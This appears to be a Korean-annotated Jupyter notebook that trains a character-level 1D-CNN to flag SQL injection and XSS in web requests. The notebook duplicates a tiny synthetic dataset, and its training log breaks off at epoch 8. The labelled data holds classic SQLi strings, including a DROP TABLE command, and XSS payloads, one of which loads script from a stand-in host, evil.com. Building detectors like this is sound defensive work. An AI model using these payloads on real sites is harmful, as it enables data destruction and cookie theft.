In [ ]:
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Embedding, Conv1D, GlobalMaxPooling1D, Dense, Dropout
from tensorflow.keras.preprocessing.sequence import pad_sequences
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report


# 1. 가상 데이터셋 생성 (Synthetic Dataset)
data = {
    'payload': [
        # 정상 패턴 (Benign)
        'index.php?id=1', 'show.php?article=12&page=2', 'about-us.html', 'login.php', 'contact_us?email=user@example.com',
        '/assets/logo.png', '/js/main.js', 'search?q=machine+learning', 'profile?user_id=883', '/products/category/electronics',
        'submit?name=Yoo&age=30', 'index.html', 'blog/post-102', 'faq?category=general', 'settings?theme=dark',
        # SQL Injection (SQLi)
        "login.php?id=1' OR '1'='1", "admin' --", "union select null, username, password from users",
        "SELECT * FROM members WHERE username = 'admin' AND password = '' OR '1'='1'", "1' or 1=1--",
        "'; DROP TABLE users; --", "admin' AND 1=1", "id=5 UNION SELECT ALL", "1' ORDER BY 1--", "id=1' OR 'any'='any",
        # XSS (Cross-Site Scripting)
        "<script>alert(1)</script>", "<iframe src='javascript:alert(1)'>", "<img src=x onerror=alert('hack')>",
        "<body onload=alert(document.cookie)>", "<svg/onload=alert(1)>", "<script src='http://evil.com/payload.js'></script>",
        "javascript:alert('XSS')", "<a href='javascript:alert(1)'>Click me</a>", "<math><a xlink:href='javascript:alert(1)'>",
        "<details open nontrigger=alert(1)>"
    ],
    'label': [
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  # 0: 정상 (15개)
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1,                  # 1: 악성 공격 (10개)
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1                   # 1: 악성 공격 (10개)
    ]
}

df = pd.DataFrame(data)

# 단순 학습 데모를 위해 데이터를 15배로 복제하여 미니 데이터셋 구축 (총 525행)
df = pd.concat([df] * 15, ignore_index=True)
print(f"총 데이터 수: {len(df)}개 (정상: {len(df[df['label']==0])}개, 공격: {len(df[df['label']==1])}개)")



# 2. 문자 단위 전처리 (Character Tokenization)

# 웹 로그 분석에 주로 사용되는 ASCII 영역의 글자 사전 정의
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.!@#$%^&*()_+={}[]|\\:;'\"<>,.?/~` "
char_dict = {char: idx + 2 for idx, char in enumerate(CHARS)}  # 0: 패딩, 1: 모르는 문자(OOV)
char_dict['<PAD>'] = 0
char_dict['<OOV>'] = 1

vocab_size = len(char_dict)
max_len = 100  # 고정할 최대 시퀀스 길이 (100글자)

def text_to_char_indices(text, max_len=100):
    """문자열을 사전에 정의된 정수 인덱스 리스트로 변환"""
    indices = []
    for char in text:
        indices.append(char_dict.get(char, 1))  # 사전에 없으면 OOV(1) 처리
    return indices

# 전처리 실행
sequences = [text_to_char_indices(text, max_len) for text in df['payload']]

# 패딩(Padding): 모든 데이터의 길이를 100자로 고정 (뒤를 0으로 채움)
X = pad_sequences(sequences, maxlen=max_len, padding='post', truncating='post')
y = df['label'].values

# 학습 데이터와 테스트 데이터 분할 (8:2)
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

print(f"문자 사전 크기 (Vocab Size): {vocab_size}")
print(f"학습 데이터 크기: {X_train.shape}, 테스트 데이터 크기: {X_test.shape}")


# 3. 1D-CNN 모델 설계 (Model Architecture)

model = Sequential([
    # [임베딩 층] 각 문자 인덱스를 32차원의 고차원 수치 벡터로 조밀하게 정렬
    Embedding(input_dim=vocab_size, output_dim=32, input_length=max_len),

    # [1차원 CNN 층] 5글자씩 훑어가는 필터(Kernel)를 64개 사용하여 악성 유형 패턴 추출
    Conv1D(filters=64, kernel_size=5, activation='relu'),

    # [글로벌 맥스 풀링] 훑어본 영역 중 가장 특징이 뚜렷한(점수가 가장 높은) 핵심 값들만 추림
    GlobalMaxPooling1D(),

    # [완전 연결 신경망] 학습된 패턴 정보를 조합하는 은닉층
    Dense(32, activation='relu'),

    Dropout(0.3),  # 과적합 방지를 위해 학습 중 일부 뉴런을 끎

    # [출력층] 정상(0)과 공격(1)의 확률값을 결정하는 시그모이드 함수 적용
    Dense(1, activation='sigmoid')
])

model.compile(optimizer='adam',
              loss='binary_crossentropy',
              metrics=['accuracy'])

model.summary()


# 4. 모델 학습 (Training)
print("\n[4] 모델 학습 시작...")
history = model.fit(X_train, y_train,
                    epochs=10,
                    batch_size=16,
                    validation_split=0.1,
                    verbose=1)



# 5. 모델 평가 (Evaluation)
loss, accuracy = model.evaluate(X_test, y_test, verbose=0)
print(f"테스트 최종 정확도: {accuracy*100:.2f}%")

# 오차 분석 리포트 출력
y_pred_prob = model.predict(X_test)
y_pred = (y_pred_prob > 0.5).astype(int)

print("\n[평가 보고서]")
print(classification_report(y_test, y_pred, target_names=['Normal (정상)', 'Attack (공격)']))


# 6. 신종/미탐 페이로드 탐지 테스트 (Inference)
print("\n[6] 신규 실시간 유입 트래픽 검사 수행...")
new_payloads = [
    "index.php?page=notice",                 # 정상 예상
    "union select password from admin",      # SQLi 공격 예상
    "<script>confirm('hacked')</script>",    # XSS 공격 예상
    "safe_param=hello_world"                 # 정상 예상
]

# 신규 데이터 전처리
new_seq = [text_to_char_indices(p, max_len) for p in new_payloads]
new_pad = pad_sequences(new_seq, maxlen=max_len, padding='post', truncating='post')

# 예측 수행
predictions = model.predict(new_pad)

print("\n====== 실시간 방화벽 차단 피드백 ======")
for payload, prob in zip(new_payloads, predictions):
    result = "🔴 [BLOCK] 악성 위협 페이로드 차단!" if prob[0] > 0.5 else "🟢 [PASS] 정상 트래픽 통과"
    print(f"요청 페이로드 : {payload}")
    print(f"공격 위험도   : {prob[0]*100:.2f}%")
    print(f"보안 장비 조치: {result}")
    print("-" * 55)

총 데이터 수: 525개 (정상: 225개, 공격: 300개)
문자 사전 크기 (Vocab Size): 97
학습 데이터 크기: (420, 100), 테스트 데이터 크기: (105, 100)


/usr/local/lib/python3.12/dist-packages/keras/src/layers/core/embedding.py:100: UserWarning: Argument `input_length` is deprecated. Just remove it.
  warnings.warn(


Model: "sequential"

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
┃ Layer (type)                    ┃ Output Shape           ┃       Param # ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩
│ embedding (Embedding)           │ ?                      │   0 (unbuilt) │
├─────────────────────────────────┼────────────────────────┼───────────────┤
│ conv1d (Conv1D)                 │ ?                      │   0 (unbuilt) │
├─────────────────────────────────┼────────────────────────┼───────────────┤
│ global_max_pooling1d            │ ?                      │             0 │
│ (GlobalMaxPooling1D)            │                        │               │
├─────────────────────────────────┼────────────────────────┼───────────────┤
│ dense (Dense)                   │ ?                      │   0 (unbuilt) │
├─────────────────────────────────┼────────────────────────┼───────────────┤
│ dropout (Dropout)               │ ?                      │             0 │
├─────────────────────────────────┼────────────────────────┼───────────────┤
│ dense_1 (Dense)                 │ ?                      │   0 (unbuilt) │
└─────────────────────────────────┴────────────────────────┴───────────────┘

 Total params: 0 (0.00 B)

 Trainable params: 0 (0.00 B)

 Non-trainable params: 0 (0.00 B)


[4] 모델 학습 시작...
Epoch 1/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 7s 132ms/step - accuracy: 0.5741 - loss: 0.6620 - val_accuracy: 0.5952 - val_loss: 0.6104
Epoch 2/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 8ms/step - accuracy: 0.7910 - loss: 0.5350 - val_accuracy: 1.0000 - val_loss: 0.4156
Epoch 3/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 9ms/step - accuracy: 0.9921 - loss: 0.2664 - val_accuracy: 1.0000 - val_loss: 0.1314
Epoch 4/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 9ms/step - accuracy: 0.9974 - loss: 0.0835 - val_accuracy: 1.0000 - val_loss: 0.0293
Epoch 5/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 9ms/step - accuracy: 1.0000 - loss: 0.0268 - val_accuracy: 1.0000 - val_loss: 0.0089
Epoch 6/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 8ms/step - accuracy: 1.0000 - loss: 0.0126 - val_accuracy: 1.0000 - val_loss: 0.0041
Epoch 7/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 6ms/step - accuracy: 1.0000 - loss: 0.0085 - val_accuracy: 1.0000 - val_loss: 0.0023
Epoch 8/10
24/24 ━━━━━━━━━━━━━━━━━━━━ 0s 6ms/step - accuracy: 1.0000 - loss: 0.0049 - val_accuracy: